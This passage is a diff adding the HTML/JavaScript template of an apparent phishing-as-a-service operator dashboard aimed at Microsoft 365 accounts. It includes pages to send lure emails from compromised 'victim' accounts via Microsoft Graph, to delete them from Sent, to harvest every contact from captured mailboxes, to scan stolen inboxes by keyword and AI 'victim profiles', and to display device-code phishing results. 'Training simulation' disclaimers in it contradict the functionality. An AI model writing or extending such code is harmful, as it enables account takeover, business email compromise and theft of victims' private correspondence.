+                                <textarea id="b2b_recipients" class="form-control" rows="3" placeholder="target1@example.com&#10;target2@example.com"></textarea>
+                            </div>
+                            <div class="mb-2">
+                                <label>Personalization Link</label>
+                                <input type="url" id="b2b_link" class="form-control" placeholder="https://your-link.com" oninput="updateB2BPreview()">
+                            </div>
+                            <div class="mb-2">
+                                <label>Sender Name</label>
+                                <input type="text" id="b2b_sender_name" class="form-control" placeholder="John Smith" oninput="updateB2BPreview()">
+                            </div>
+                            <div class="mb-2">
+                                <label>Template</label>
+                                <select id="b2b_template" class="form-control" onchange="updateB2BTemplate()">
+                                    <option value="custom">— Select a template —</option>
+                                    {% for category in categories %}
+                                    <optgroup label="{{ category }}">
+                                        {% for template in templates if template.category == category %}
+                                        <option value="{{ template.id }}">{{ template.name }}</option>
+                                        {% endfor %}
+                                    </optgroup>
+                                    {% endfor %}
+                                    <option value="custom">— Custom (write below) —</option>
+                                </select>
+                            </div>
+                            <div class="mb-2">
+                                <label>Custom Subject</label>
+                                <input type="text" id="b2b_subject" class="form-control" placeholder="RE: Important" oninput="updateB2BPreview()">
+                            </div>
+                            <div class="mb-2">
+                                <label>Custom Body</label>
+                                <textarea id="b2b_body" class="form-control" rows="5" placeholder="Write custom email..." oninput="updateB2BPreview()"></textarea>
+                            </div>
+
+                            <!-- Send Method Selection -->
+                            <div class="mb-2">
+                                <label>Send Method</label>
+                                <div class="form-check">
+                                    <input class="form-check-input" type="radio" name="b2b_method" id="b2b_method_graph" value="graph" checked>
+                                    <label class="form-check-label" for="b2b_method_graph">Microsoft Graph (as victim)</label>
+                                </div>
+                                <div class="form-check">
+                                    <input class="form-check-input" type="radio" name="b2b_method" id="b2b_method_smtp" value="smtp">
+                                    <label class="form-check-label" for="b2b_method_smtp">SMTP (your own email)</label>
+                                </div>
+                            </div>
+
+                            <div class="row">
+                                <div class="col-md-4"><label>Delay (s)</label><input type="number" id="b2b_delay" class="form-control" value="2"></div>
+                                <div class="col-md-4"><label>Importance</label><select id="b2b_importance" class="form-control"><option>Normal</option><option>High</option></select></div>
+                                <div class="col-md-4"><label>&nbsp;</label><div class="form-check"><input type="checkbox" id="b2b_delete" class="form-check-input"><label class="form-check-label text-muted small">Delete from Sent</label></div></div>
+                            </div>
+                            <button type="submit" class="btn btn-danger w-100 mt-2">📤 Start Job</button>
+                        </form>
+                    </div>
+                </div>
+            </div>
+            <div class="col-md-5">
+                <div class="card bg-dark">
+                    <div class="card-body">
+                        <h6 class="text-success">📋 Summary</h6>
+                        <hr>
+                        <p><strong>From:</strong> <span id="summary_from">-</span></p>
+                        <p><strong>Recipients:</strong> <span id="summary_recipients">0</span></p>
+                        <p><strong>Delay:</strong> <span id="summary_delay">2s</span></p>
+                        <p><strong>Link:</strong> <span id="summary_link">-</span></p>
+                        <p><strong>Template:</strong> <span id="summary_template">-</span></p>
+                        <hr>
+                        <div id="b2b_result" class="alert alert-info">Ready</div>
+                    </div>
+                </div>
+                <!-- Live Email Preview -->
+                <div class="card mt-3">
+                    <div class="card-header">📧 Live Email Preview</div>
+                    <div class="card-body" style="padding:8px;">
+                        <div id="emailPreviewContainer">
+                            <div class="email-preview-empty"><i class="bi bi-envelope"></i><span>Enter email content to see a live preview</span></div>
+                        </div>
+                    </div>
+                </div>
+                <div class="card mt-3"><div class="card-header">📊 Send Jobs</div><div class="card-body"><div class="alert alert-secondary">No jobs yet.</div></div></div>
+            </div>
+        </div>
+    </div>
+
+    <!-- ============================================================ -->
+    <!-- PAGE: EMAIL EXTRACTOR -->
+    <!-- ============================================================ -->
+    <div id="page-extractor" class="page-content" style="display:none;">
+        <div class="page-title"><span><i class="bi bi-search"></i> Email Extractor <small>Extract every email address from a mailbox. Fast, deduplicated, one click.</small></span></div>
+        <div class="card">
+            <div class="card-header">Select Token</div>
+            <div class="card-body">
+                <div class="row">
+                    <div class="col-md-6">
+                        <select id="extractor_victim" class="form-control">
+                            {% for v in recent_victims if v.access_token %}
+                            <option value="{{ v.id }}">{{ v.email or 'Victim ' ~ v.id }}</option>
+                            {% endfor %}
+                        </select>
+                    </div>
+                    <div class="col-md-3"><button class="btn btn-success w-100" onclick="startExtraction()">🚀 Start Extraction</button></div>
+                    <div class="col-md-3"><button class="btn btn-warning w-100" onclick="classifyExtracted()">📊 Classify</button></div>
+                </div>
+            </div>
+        </div>
+        <div id="extraction_results">
+            <div class="card">
+                <div class="card-header">📋 Discovered Contacts</div>
+                <div class="card-body">
+                    <div id="providerGroups" class="row mb-3"></div>
+                    <div id="selectedProvider" style="display:none;">
+                        <h6 class="text-success" id="selectedProviderName"></h6>
+                        <div id="emailList" class="mt-2"></div>
+                        <div class="mt-2">
+                            <button class="btn btn-sm btn-outline-primary" onclick="copySelectedProvider()">📋 Copy</button>
+                            <button class="btn btn-sm btn-outline-success" onclick="exportSelectedProvider()">📥 Export</button>
+                        </div>
+                    </div>
+                    <div id="noSelectionMessage" class="alert alert-secondary">Click a provider above to view emails.</div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- ============================================================ -->
+    <!-- PAGE: DOMAINS (Coming Soon) -->
+    <!-- ============================================================ -->
+    <div id="page-domains" class="page-content" style="display:none;">
+        <div class="page-title"><span><i class="bi bi-globe2"></i> Domains <small>Link your VPS, provision lure stack, then point a domain at it</small></span></div>
+        <div class="card">
+            <div class="card-body">
+                <div class="alert alert-info text-center">
+                    <h5><i class="bi bi-clock-history"></i> Coming Soon</h5>
+                    <p class="mb-0">Advanced domain, VPS, and Cloudflare integration will be available in the next version.</p>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- ============================================================ -->
+    <!-- PAGE: KEYWORD ALERTS -->
+    <!-- ============================================================ -->
+    <div id="page-keywords" class="page-content" style="display:none;">
+        <div class="page-title"><span><i class="bi bi-tags"></i> Keyword Alerts <small>Keywords are automatically scanned against new emails in your B2B captured inboxes.</small></span></div>
+        <div class="stat-grid" style="grid-template-columns: repeat(2,1fr);">
+            <div class="stat-card"><div class="stat-number">0</div><div class="stat-label">Active Keywords</div></div>
+            <div class="stat-card"><div class="stat-number">0</div><div class="stat-label">Matches</div></div>
+        </div>
+        <div class="card">
+            <div class="card-body">
+                <form method="POST" action="{{ url_for('operator.add_keyword') }}" class="row g-2">
+                    <div class="col-md-6"><input type="text" name="keyword" class="form-control" placeholder="Add keyword (e.g. invoice)" required></div>
+                    <div class="col-md-2"><button type="submit" class="btn btn-success">➕ Add</button></div>
+                    <div class="col-md-4"><small class="text-muted">Scan captured inboxes</small></div>
+                </form>
+                <hr>
+                <div class="alert alert-secondary">No keywords yet. Add keywords above to start scanning captured inboxes.</div>
+            </div>
+        </div>
+    </div>
+
+    <!-- ============================================================ -->
+    <!-- PAGE: AI INTELLIGENCE -->
+    <!-- ============================================================ -->
+    <div id="page-ai" class="page-content" style="display:none;">
+        <div class="page-title"><span><i class="bi bi-robot"></i> AI Intelligence <small>Configure AI-powered email analysis</small></span></div>
+        <div class="alert alert-info">AI independently scans all incoming emails and alerts you about high-value content — no keywords needed.</div>
+        <div class="card">
+            <div class="card-header">Alert Mode</div>
+            <div class="card-body">
+                <div class="row">
+                    <div class="col-md-4">
+                        <div class="card bg-dark border-secondary alert-mode-card" onclick="selectAIMode('keyword')" id="ai-mode-keyword">
+                            <div class="card-body text-center">
+                                <h6>Keyword Only</h6>
+                                <small class="text-muted">Traditional keyword matching</small>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="col-md-4">
+                        <div class="card bg-dark border-secondary alert-mode-card" onclick="selectAIMode('ai')" id="ai-mode-ai">
+                            <div class="card-body text-center">
+                                <h6>AI Only</h6>
+                                <small class="text-muted">AI analyzes all emails</small>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="col-md-4">
+                        <div class="card bg-dark border-secondary alert-mode-card" onclick="selectAIMode('both')" id="ai-mode-both">
+                            <div class="card-body text-center">
+                                <h6>Both</h6>
+                                <small class="text-muted">Keywords + AI</small>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+        <div class="card">
+            <div class="card-header">Configuration</div>
+            <div class="card-body">
+                <form method="POST" action="{{ url_for('operator.update_ai_settings') }}">
+                    <div class="mb-3"><label>Provider</label><select name="provider" class="form-select"><option value="deepseek">DeepSeek (Recommended)</option><option value="openai">OpenAI</option><option value="groq">Groq</option><option value="anthropic">Anthropic</option></select></div>
+                    <div class="mb-3"><label>API Key</label><input type="password" name="api_key" class="form-control" placeholder="sk-..."></div>
+                    <div class="mb-3"><label>Model</label><select name="model" class="form-select"><option value="deepseek-chat">deepseek-chat</option><option value="gpt-4">gpt-4</option><option value="claude-3">claude-3</option></select></div>
+                    <div class="mb-3"><label>Risk Threshold</label><input type="range" name="risk_threshold" class="form-range" min="0" max="100" value="70" id="aiRiskThreshold"><span id="aiThresholdValue">70%</span></div>
+                    <button type="submit" class="btn btn-success">💾 Save Settings</button>
+                </form>
+            </div>
+        </div>
+    </div>
+
+    <!-- ============================================================ -->
+    <!-- PAGE: PROFILES -->
+    <!-- ============================================================ -->
+    <div id="page-profiles" class="page-content" style="display:none;">
+        <div class="page-title"><span><i class="bi bi-person-badge"></i> Victim Profiles <small>AI-discovered intelligence dossiers on targets across your captured inboxes.</small></span></div>
+        <div class="stat-grid" style="grid-template-columns: repeat(4,1fr);">
+            <div class="stat-card"><div class="stat-number">0</div><div class="stat-label">Total Profiles</div></div>
+            <div class="stat-card"><div class="stat-number">0</div><div class="stat-label">High Risk (80+)</div></div>
+            <div class="stat-card"><div class="stat-number">0</div><div class="stat-label">Financial Access</div></div>
+            <div class="stat-card"><div class="stat-number">0</div><div class="stat-label">Companies</div></div>
+        </div>
+        <div class="card"><div class="card-body"><div class="alert alert-secondary">No profiles yet. Enable Victim Profiling in AI Intelligence settings.</div></div></div>
+    </div>
+
+    <!-- ============================================================ -->
+    <!-- PAGE: SETTINGS (with SMTP and Password Change) -->
+    <!-- ============================================================ -->
+    <div id="page-settings" class="page-content" style="display:none;">
+        <div class="page-title"><span><i class="bi bi-gear"></i> Settings <small>Manage your account, appearance, notifications, and security</small></span></div>
+
+        <!-- Subscription -->
+        <div class="card">
+            <div class="card-header">Subscription</div>
+            <div class="card-body text-light">
+                <p><strong>omila365</strong> 
+                    {% if current_user.expiry_date %}
+                        <span class="badge {% if current_user.expiry_date > now %}bg-warning{% else %}bg-danger{% endif %}">
+                            {% if current_user.expiry_date > now %}Active{% else %}Expired{% endif %}
+                        </span>
+                    {% else %}
+                        <span class="badge bg-secondary">Trial</span>
+                    {% endif %}
+                </p>
+                <p><strong>Expires:</strong> {{ current_user.expiry_date.strftime('%B %d, %Y') if current_user.expiry_date else 'N/A' }}</p>
+                <p><strong>Days Remaining:</strong> 
+                    {% if current_user.expiry_date %}
+                        {{ (current_user.expiry_date - now).days if (current_user.expiry_date - now).days > 0 else 0 }}
+                    {% else %}
+                        N/A
+                    {% endif %}
+                </p>
+                <button class="btn btn-info btn-sm" onclick="extendSubscription()">Extend Subscription</button>
+            </div>
+        </div>
+
+        <!-- Account -->
+        <div class="card">
+            <div class="card-header">Account</div>
+            <div class="card-body text-light">
+                <p><strong>@{{ current_user.username }}</strong> <span class="badge bg-success">Active</span></p>
+                <p>Wallet Balance: ${{ "%.2f"|format(current_user.balance) }}</p>
+                <p>Member Since: {{ current_user.created_at.strftime('%Y-%m-%d') if current_user.created_at else 'N/A' }}</p>
+                <p>TOS Accepted: {{ current_user.created_at.strftime('%Y-%m-%d') if current_user.created_at else 'N/A' }}</p>
+            </div>
+        </div>
+
+        <!-- Change Password (AJAX) -->
+        <div class="card">
+            <div class="card-header">Change Password</div>
+            <div class="card-body">
+                <form id="changePasswordForm">
+                    <div class="mb-2"><label>Current Password</label><input type="password" id="cp_current" class="form-control" placeholder="Enter current password" required></div>
+                    <div class="mb-2"><label>New Password</label><input type="password" id="cp_new" class="form-control" placeholder="Enter new password (min 8 characters)" required></div>
+                    <div class="mb-2"><label>Confirm New Password</label><input type="password" id="cp_confirm" class="form-control" placeholder="Re-enter new password" required></div>
+                    <button type="submit" class="btn btn-success">Update Password</button>
+                </form>
+                <div id="cp_result" class="mt-2"></div>
+            </div>
+        </div>
+
+        <!-- Appearance -->
+        <div class="card">
+            <div class="card-header">Appearance</div>
+            <div class="card-body text-light">Currently using light mode</div>
+        </div>
+
+        <!-- Telegram Notifications -->
+        <div class="card">
+            <div class="card-header">Telegram Notifications</div>
+            <div class="card-body">
+                <form method="POST" action="{{ url_for('operator.update_telegram') }}">
+                    <div class="mb-2"><label>Bot Token</label><input type="text" name="bot_token" class="form-control" placeholder="e.g. 123456789.AAHdQTc..."></div>
+                    <div class="mb-2"><label>Chat ID</label><input type="text" name="chat_id" class="form-control" placeholder="Enter your Telegram Chat ID"></div>
+                    <button type="submit" class="btn btn-success">💾 Save</button>
+                </form>
+            </div>
+        </div>
+
+        <!-- SMTP Configuration -->
+        <div class="card">
+            <div class="card-header">
+                <span><i class="bi bi-envelope-paper"></i> SMTP Configuration</span>
+                <button class="btn btn-sm btn-outline-success" onclick="testSmtpConnection()">Test Connection</button>
+            </div>
+            <div class="card-body">
+                <form id="smtpSettingsForm">
+                    <div class="row">
+                        <div class="col-md-6">
+                            <div class="mb-2">
+                                <label>Enable SMTP</label>
+                                <div class="form-check form-switch">
+                                    <input class="form-check-input" type="checkbox" id="smtp_enabled">
+                                    <label class="form-check-label" for="smtp_enabled">Send emails via your own SMTP</label>
+                                </div>
+                            </div>
+                            <div class="mb-2">
+                                <label>SMTP Server</label>
+                                <input type="text" id="smtp_server" class="form-control" placeholder="smtp.gmail.com">
+                            </div>
+                            <div class="mb-2">
+                                <label>Port</label>
+                                <input type="number" id="smtp_port" class="form-control" value="587">
+                            </div>
+                            <div class="mb-2">
+                                <label>Username</label>
+                                <input type="text" id="smtp_username" class="form-control" placeholder="your-email@gmail.com">
+                            </div>
+                        </div>
+                        <div class="col-md-6">
+                            <div class="mb-2">
+                                <label>Password</label>
+                                <input type="password" id="smtp_password" class="form-control" placeholder="Leave blank to keep current">
+                            </div>
+                            <div class="mb-2">
+                                <label>From Email</label>
+                                <input type="email" id="smtp_from_email" class="form-control" placeholder="sender@example.com">
+                            </div>
+                            <div class="mb-2">
+                                <label>From Name</label>
+                                <input type="text" id="smtp_from_name" class="form-control" placeholder="Your Name">
+                            </div>
+                            <div class="mb-2 form-check">
+                                <input type="checkbox" class="form-check-input" id="smtp_use_tls" checked>
+                                <label class="form-check-label" for="smtp_use_tls">Use TLS</label>
+                            </div>
+                            <button type="submit" class="btn btn-success w-100">💾 Save SMTP Settings</button>
+                        </div>
+                    </div>
+                </form>
+                <div id="smtpTestResult" class="mt-2"></div>
+            </div>
+        </div>
+
+        <!-- Active Sessions -->
+        <div class="card">
+            <div class="card-header">Active Sessions</div>
+            <div class="card-body text-light">
+                <ul class="list-unstyled">
+                    <li>Shared VPS Panel · 05.209.87.73 · Just now</li>
+                    <li>This device · Current</li>
+                    <li>Master · Can sign out all others</li>
+                </ul>
+            </div>
+        </div>
+    </div>
+
+    <!-- ============================================================ -->
+    <!-- PAGE: MY REPORTS -->
+    <!-- ============================================================ -->
+    <div id="page-reports" class="page-content" style="display:none;">
+        <div class="page-title"><span><i class="bi bi-flag"></i> My Reports</span></div>
+        <div class="card"><div class="card-body"><div class="alert alert-secondary">No reports yet. If you encounter any issues, click "Report Issue" to let us know.</div></div></div>
+    </div>
+
+    <!-- ============================================================ -->
+    <!-- PAGE: INFRASTRUCTURE (placeholder) -->
+    <!-- ============================================================ -->
+    <div id="page-infrastructure" class="page-content" style="display:none;">
+        <div class="page-title"><span><i class="bi bi-server"></i> Infrastructure <small>Connect your own VPS to host lures and manage domains</small></span></div>
+        <div class="card">
+            <div class="card-body">
+                <div class="alert alert-secondary">No VPS Connected. Connect your own VPS to deploy lures, manage domains, and host phishing pages independently.</div>
+                <button class="btn btn-success" onclick="alert('Connect VPS modal')">Connect VPS</button>
+                <hr>
+                <div class="row">
+                    <div class="col-md-4"><i class="bi bi-server"></i> Your Server — Lures run on your own VPS</div>
+                    <div class="col-md-4"><i class="bi bi-lock"></i> Encrypted Storage — Credentials encrypted at rest</div>
+                    <div class="col-md-4"><i class="bi bi-people"></i> Full Control — You own the server and data</div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+</div><!-- end main-content -->
+
+<!-- ============================================================ -->
+<!-- MODALS -->
+<!-- ============================================================ -->
+
+<!-- Preview Modal -->
+<div class="modal fade" id="trainingPreviewModal" tabindex="-1" aria-hidden="true">
+    <div class="modal-dialog modal-xl modal-dialog-centered">
+        <div class="modal-content bg-dark text-light">
+            <div class="modal-header border-secondary">
+                <div><h5 class="modal-title"><i class="bi bi-display"></i> Training Simulation Preview</h5><small class="text-muted" id="previewTemplateMeta">Select a template to preview</small></div>
+                <button type="button" class="btn-close btn-close-white" data-bs-dismiss="modal"></button>
+            </div>
+            <div class="modal-body p-2 p-md-3"><div id="trainingPreviewCanvas"></div></div>
+            <div class="modal-footer border-secondary">
+                <span class="me-auto text-muted small"><i class="bi bi-shield-check"></i> Simulation only — no credentials, tokens, cookies, or personal data are collected.</span>
+                <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Close</button>
+            </div>
+        </div>
+    </div>
+</div>
+
+<!-- Send Lure Modal -->
+<div class="modal fade" id="sendLureModal" tabindex="-1" aria-hidden="true">
+    <div class="modal-dialog modal-lg">
+        <div class="modal-content bg-dark text-light">
+            <div class="modal-header border-secondary">
+                <h5 class="modal-title text-success"><i class="bi bi-envelope-paper"></i> Send Lure</h5>
+                <button type="button" class="btn-close btn-close-white" data-bs-dismiss="modal"></button>
+            </div>
+            <div class="modal-body">
+                <form id="sendLureForm">
+                    <input type="hidden" id="sendLureCampaignId">
+                    <div class="mb-3">
+                        <label class="text-muted">From (Victim Sender)</label>
+                        <select id="sendLureFrom" class="form-control">
+                            <option value="">-- Select a victim with token --</option>
+                            {% for v in recent_victims if v.access_token %}
+                            <option value="{{ v.id }}">{{ v.email or 'Victim ' ~ v.id }}</option>
+                            {% endfor %}
+                        </select>
+                    </div>
+                    <div class="mb-3">
+                        <label class="text-muted">Recipients (one per line)</label>
+                        <textarea id="sendLureRecipients" class="form-control" rows="3" placeholder="target1@example.com&#10;target2@example.com"></textarea>
+                    </div>
+                    <div class="mb-3">
+                        <label class="text-muted">Lure URL (auto-filled)</label>
+                        <input type="text" id="sendLureUrl" class="form-control" readonly>
+                    </div>
+                    <div class="mb-3">
+                        <label class="text-muted">Subject</label>
+                        <input type="text" id="sendLureSubject" class="form-control" value="Important: Please review this document">
+                    </div>
+                    <div class="mb-3">
+                        <label class="text-muted">Body (HTML)</label>
+                        <textarea id="sendLureBody" class="form-control" rows="5"><p>Hi,</p><p>Please review the document at the link below:</p><p><a href="{{link}}">Click here to review</a></p><p>Regards,<br>IT Team</p></textarea>
+                        <small class="text-muted">Use {{link}} as placeholder for the lure URL.</small>
+                    </div>
+                </form>
+            </div>
+            <div class="modal-footer border-secondary">
+                <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Cancel</button>
+                <button type="button" class="btn btn-success" onclick="sendLure()">🧪 Run Simulation</button>
+            </div>
+        </div>
+    </div>
+</div>
+
+<!-- ===== NEW: PROCESS RESULT MODAL ===== -->
+<div class="modal fade" id="processResultModal" tabindex="-1" aria-hidden="true">
+    <div class="modal-dialog modal-lg modal-dialog-centered">
+        <div class="modal-content bg-dark text-light">
+            <div class="modal-header border-secondary">
+                <h5 class="modal-title text-success"><i class="bi bi-arrow-repeat"></i> Process Campaign Results</h5>
+                <button type="button" class="btn-close btn-close-white" data-bs-dismiss="modal"></button>
+            </div>
+            <div class="modal-body" id="processResultBody">
+                <!-- Dynamically filled -->
+            </div>
+            <div class="modal-footer border-secondary">
+                <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Close</button>
+            </div>
+        </div>
+    </div>
+</div>
+
+<!-- ===== NEW: LEADS RESULT MODAL ===== -->
+<div class="modal fade" id="leadsResultModal" tabindex="-1" aria-hidden="true">
+    <div class="modal-dialog modal-lg modal-dialog-centered">
+        <div class="modal-content bg-dark text-light">
+            <div class="modal-header border-secondary">
+                <h5 class="modal-title text-info"><i class="bi bi-person-lines-fill"></i> Leads for Campaign</h5>
+                <button type="button" class="btn-close btn-close-white" data-bs-dismiss="modal"></button>
+            </div>
+            <div class="modal-body" id="leadsResultBody">
+                <!-- Dynamically filled -->
+            </div>
+            <div class="modal-footer border-secondary">
+                <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Close</button>
+            </div>
+        </div>
+    </div>
+</div>
+
+<!-- Report Issue Modal -->
+<div class="modal fade" id="reportModal" tabindex="-1" aria-hidden="true">
+    <div class="modal-dialog modal-dialog-centered">
+        <div class="modal-content bg-dark text-light">
+            <div class="modal-header border-secondary">
+                <h5 class="modal-title text-warning"><i class="bi bi-exclamation-triangle"></i> Report Issue</h5>
+                <button type="button" class="btn-close btn-close-white" data-bs-dismiss="modal"></button>
+            </div>
+            <div class="modal-body">
+                <p>Describe the issue you are facing. This will be sent to the admin via Telegram.</p>
+                <form id="reportForm">
+                    <div class="mb-3">
+                        <label class="text-muted">Subject</label>
+                        <input type="text" id="reportSubject" class="form-control" placeholder="Brief summary of the issue" required>
+                    </div>
+                    <div class="mb-3">
+                        <label class="text-muted">Message</label>
+                        <textarea id="reportMessage" class="form-control" rows="4" placeholder="Detailed description..." required></textarea>
+                    </div>
+                    <button type="submit" class="btn btn-warning w-100">📤 Send Report</button>
+                </form>
+                <div id="reportResult" class="mt-2"></div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<!-- ============================================================ -->
+<!-- JAVASCRIPT -->
+<!-- ============================================================ -->
+<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
+<script>
+    // ===== EMBED TEMPLATE DATA =====
+    const TEMPLATE_DATA = {
+        {% for t in templates %}
+        "{{ t.id }}": {
+            subject: {{ t.email_subject | default('') | tojson }},
+            body: {{ t.email_body_html | default('') | tojson }}
+        },
+        {% endfor %}
+    };
+
+    // ===== NAVIGATION =====
+    function showPage(page) {
+        document.querySelectorAll('.page-content').forEach(el => el.style.display = 'none');
+        const target = document.getElementById('page-' + page);
+        if (target) target.style.display = 'block';
+        document.querySelectorAll('.sidebar .nav-item').forEach(el => el.classList.remove('active'));
+        const navItem = document.querySelector('.sidebar .nav-item[href="#' + page + '"]');
+        if (navItem) navItem.classList.add('active');
+    }
+    document.addEventListener('DOMContentLoaded', function() { showPage('dashboard'); });
+
+    // ===== TEMPLATE BROWSER =====
+    function filterTemplates() {
+        const query = (document.getElementById('templateSearch')?.value||'').trim().toLowerCase();
+        const category = document.getElementById('templateCategory')?.value||'all';
+        let visible = 0;
+        document.querySelectorAll('#templateGrid .template-card').forEach(card => {
+            const show = (!query || card.dataset.name.includes(query) || card.dataset.desc.includes(query)) && (category === 'all' || card.dataset.category === category);
+            card.style.display = show ? '' : 'none';
+            if (show) visible++;
+        });
+        const count = document.getElementById('templateCount');
+        if (count) count.textContent = `${visible} template${visible === 1 ? '' : 's'} shown`;
+    }
+
+    function fillTemplateFields(templateId) {
+        const card = document.querySelector(`#templateGrid .template-card[data-template-id="${templateId}"]`);
+        if (!card) return;
+        const senderName = card.dataset.sender || 'Microsoft Security Team';
+        const docTitle = card.dataset.title || card.dataset.name || 'Document';
+        document.querySelector('#lureForm input[name="sender_name"]').value = senderName;
+        document.querySelector('#lureForm input[name="document_title"]').value = docTitle;
+    }
+
+    function selectTemplateCard(card) {
+        document.querySelectorAll('#templateGrid .template-card').forEach(c => c.classList.remove('selected'));
+        card.classList.add('selected');
+        const id = card.dataset.templateId;
+        const select = document.querySelector('#lureForm select[name="template_id"]');
+        if (select) select.value = id;
+        const b2b = document.getElementById('b2b_template');
+        if (b2b) { b2b.value = id; updateB2BTemplate(); }
+        showTrainingPreview(card);
+        fillTemplateFields(id);
+    }
+
+    document.querySelector('#lureForm select[name="template_id"]')?.addEventListener('change', function() {
+        const id = this.value;
+        const card = document.querySelector(`#templateGrid .template-card[data-template-id="${id}"]`);
+        if (card) selectTemplateCard(card);
+    });
+
+    function showTrainingPreview(card) {
+        const name = card.querySelector('.template-name')?.textContent?.trim() || 'Security Awareness Template';
+        const category = card.dataset.category || 'training';
+        const description = card.querySelector('.template-desc')?.textContent?.trim() || 'Security awareness simulation';
+        const canvas = document.getElementById('trainingPreviewCanvas');
+        const meta = document.getElementById('previewTemplateMeta');
+        if (meta) meta.textContent = `${name} · ${category}`;
+        if (canvas) canvas.innerHTML = `<div class="simulation-preview"><div class="browser-bar"><span class="browser-dot"></span><span class="browser-dot"></span><span class="browser-dot"></span><div class="address">training.local / awareness-preview</div></div><div class="sim-banner"><i class="bi bi-info-circle"></i> SECURITY AWARENESS EXERCISE — NON-FUNCTIONAL SIMULATION</div><div class="sim-content"><div class="sim-card"><div class="sim-brand">Awareness Lab</div><div class="sim-title">${escapeHtml(name)}</div><div class="sim-copy">${escapeHtml(description)}</div><div class="sim-copy" style="margin-top:10px"><strong>Category:</strong> ${escapeHtml(category)}</div><span class="sim-action">Continue to training</span><div style="margin-top:18px;padding-top:14px;border-top:1px solid #e7ebef;color:#8793a0;font-size:.72rem">No login, password, access-token, cookie, or form-submission functionality is present in this preview.</div></div></div></div>`;
+        bootstrap.Modal.getOrCreateInstance(document.getElementById('trainingPreviewModal')).show();
+    }
+    function escapeHtml(value) { return String(value).replace(/[&<>"']/g, c => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'})[c]); }
+
+    // ===== LURE HELPERS =====
+    function copyLureUrl(campaignId) {
+        const url = window.location.origin + '/lure/' + campaignId;
+        navigator.clipboard.writeText(url).then(() => { alert('✅ Lure URL copied: ' + url); }).catch(() => { prompt('Copy this URL:', url); });
+    }
+    async function showDeviceCodes(campaignId) {
+        try {
+            const response = await fetch('/operator/campaign/' + campaignId + '/device_codes');
+            const victims = await response.json();
+            if (victims.length === 0) { alert('No victims for this campaign.'); return; }
+            let msg = '📋 Device Codes:\n\n';
+            victims.forEach(v => { msg += `ID: ${v.id} | Code: ${v.user_code} | Status: ${v.status}\n`; });
+            alert(msg);
+        } catch (err) { alert('Error: ' + err.message); }
+    }
+    function toggleLureForm() {
+        const config = document.getElementById('advancedConfig');
+        config.style.display = config.style.display === 'none' ? 'block' : 'none';
+    }
+    function previewLure() {
+        const selected = document.querySelector('#templateGrid .template-card.selected') || document.querySelector('#templateGrid .template-card');
+        if (selected) showTrainingPreview(selected);
+        else alert('Select a template first.');
+    }
+
+    // ===== CAMPAIGN TOGGLE & DELETE =====
+    function toggleCampaign(campaignId) {
+        if (!confirm('Toggle campaign status?')) return;
+        fetch('/operator/campaign/' + campaignId + '/toggle', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' }
+        })
+        .then(r => r.json())
+        .then(data => {
+            alert(data.message);
+            location.reload();
+        })
+        .catch(err => alert('Error: ' + err));
+    }
+    function deleteCampaign(campaignId) {
+        if (!confirm('Delete this campaign and all its victims? This cannot be undone.')) return;
+        fetch('/operator/campaign/' + campaignId + '/delete', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' }
+        })
+        .then(r => { if (r.ok) { alert('Campaign deleted.'); location.reload(); } else { alert('Failed to delete.'); } })
+        .catch(err => alert('Error: ' + err));
+    }
+
+    // ===== SEND LURE MODAL =====
+    function openSendLureModal(campaignId, campaignName) {
+        const url = window.location.origin + '/lure/' + campaignId;
+        document.getElementById('sendLureCampaignId').value = campaignId;
+        document.getElementById('sendLureUrl').value = url;
+        document.getElementById('sendLureSubject').value = 'Action required: Review document from ' + campaignName;
+        const bodyTextarea = document.getElementById('sendLureBody');
+        bodyTextarea.value = bodyTextarea.value.replace(/\{\{link\}\}/g, url);
+        const modal = new bootstrap.Modal(document.getElementById('sendLureModal'));
+        modal.show();
+    }
+
+    function sendLure() {
+        const campaignId = document.getElementById('sendLureCampaignId').value;
+        const fromVictimId = document.getElementById('sendLureFrom').value;
+        const recipients = document.getElementById('sendLureRecipients').value;
+        const subject = document.getElementById('sendLureSubject').value;
+        let body = document.getElementById('sendLureBody').value;
+        const lureUrl = document.getElementById('sendLureUrl').value;
+        if (!fromVictimId) { alert('Please select a sender victim.'); return; }
+        if (!recipients.trim()) { alert('Please enter at least one recipient.'); return; }
+        body = body.replace(/\{\{link\}\}/g, lureUrl);
+        fetch('/operator/b2b_send', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                victim_id: fromVictimId,
+                subject: subject,
+                body: body,
+                recipients: recipients,
+                method: 'graph'
+            })
+        })
+        .then(r => r.json())
+        .then(data => {
+            if (data.sent !== undefined) {
+                alert('✅ Sent ' + data.sent + ' of ' + data.total + ' emails. Failed: ' + (data.failed ? data.failed.length : 0));
+                bootstrap.Modal.getInstance(document.getElementById('sendLureModal')).hide();
+            } else {
+                alert('❌ Error: ' + (data.error || 'Unknown error'));
+            }
+        })
+        .catch(err => alert('❌ Error: ' + err.message));
+    }
+
+    // ===== B2B TEMPLATE FUNCTIONS =====
+    function updateB2BTemplate() {
+        const select = document.getElementById('b2b_template');
+        const selected = select.value;
+        if (selected === 'custom') {
+            document.getElementById('b2b_subject').value = '';
+            document.getElementById('b2b_body').value = '';
+            document.getElementById('summary_template').textContent = 'Custom';
+            updateB2BPreview();
+            return;
+        }
+        const data = TEMPLATE_DATA[selected];
+        if (data) {
+            document.getElementById('b2b_subject').value = data.subject;
+            document.getElementById('b2b_body').value = data.body;
+            document.getElementById('summary_template').textContent = select.options[select.selectedIndex].text;
+            updateB2BPreview();
+        } else {
